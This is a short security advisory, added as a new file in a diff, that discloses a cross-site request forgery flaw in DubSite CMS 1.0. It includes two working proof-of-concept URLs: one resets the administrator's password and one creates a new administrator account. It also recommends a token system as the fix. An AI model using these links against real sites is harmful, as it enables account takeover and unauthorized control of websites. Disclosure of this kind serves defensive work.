@@ -1,0 +1,59 @@
+Pentest Information:
+====================
+Connection has discovered a Cross Site Request Forgery(CSRF) vulnerability in DubSite CMS v1.0
+
+
+Details
+=======
+Tested on OS:		Windows XP
+Tested with Software:	Mozilla Firefox 3.5.x
+
+Vulnerable Products: 	DubSite CMS
+Affected Versions:	1.0 	
+Vulnerability Type:	Cross Site Request Forgery
+Security-Risk: 		High
+
+Vendor-URL: 		http://www.dubsite.net
+Preview-URL:		http://www.opensourcecms.com/demo/1/282/Dubsite
+
+Vendor-Status: 		Not informed
+Patch/Fix-Status:	Fixed version not released
+Advisory-Status:	Written | 12/15/09
+
+Advisory-URL: 		
+Report-URL:		
+
+
+Introduction:
+=============
+Dubsite CMS is a minimalistic yet powerful approach to web content management. Dubsite is written in PHP, built upon the Zend Framework and published under the GNU General Public License. It's goal is to simplify effective management and handling of websites without being overbearing to non-technical users.
+
+(Copy from the vendors homepage: http://www.dubsite.net)
+
+More Details:
+=============
+Due to the lack of multiple input validation errors, an attacker is able to change the password of the administrative user
+
+Proof of Concept:
+=================
+The following link will change the password of the administrative account. Changing the options will also allow you to change the name of the admin account:
+
+http://server/dubsite/index.php/admin/users/accounts/edit/1?username=admin&userpassword=own3d&userpassword2=own3d&role_id=1&active=1&update=Update
+
+This link creates a user "hax0r" with password test123 and adds it to the administrator group.
+
+http://server/dubsite/index.php/admin/users/accounts?role_id=1&username=hax0r&userpassword=test123&userpassword2=test123&create=Create
+
+Fix & Patch:
+============
+To fix the bugs a token system is highly advised
+
+Security Risk:
+==============
+An attacker is able to change the password of the administrative user thus having complete control over the site. The risk is estimated as HIGH
+
+Author:
+=======
+The Author & Writer is a Part of the HackTalk Security Group.
+
+~CONNECTION
